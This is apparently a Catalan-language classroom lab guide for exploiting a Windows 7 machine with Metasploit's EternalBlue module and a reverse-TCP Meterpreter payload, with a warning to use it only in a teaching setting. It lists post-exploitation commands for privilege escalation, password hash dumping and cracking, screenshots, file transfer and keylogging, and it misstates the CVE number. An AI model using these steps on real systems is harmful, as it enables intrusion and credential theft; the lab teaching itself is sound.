## En aesta pràctica prepararem la màquina `Windows 7 ` per a poder realitzar algunes activitats amb Metasploit.

!!!danger "Perill!!"
    No proveu açò fora d'un entorn didáctic. Podrieu cometrer un delicte...

### Explotar vulnerabilitat `CVE-2017-010` amb Eternalblue i Doublepulsar des de Metasploit

* Simplement utilitzem el següent exploit:

`use exploit/windows/smb/ms17_010_eternalblue`...i ens torna el control mitjançant un **shell o un Meterpreter** (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). 

* i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`

Ja estem dins...

* Comandaments 
    * sysinfo
    * pwd
    * getuid
    * migrate pid por si caso cierra el programa que me ha conectado
    * getsystem
    * hashdump -> crackstation
    * screenshot
    * upload de kali a win7
    * download de W7 a Kali
    * keyscan_start keyscan_dump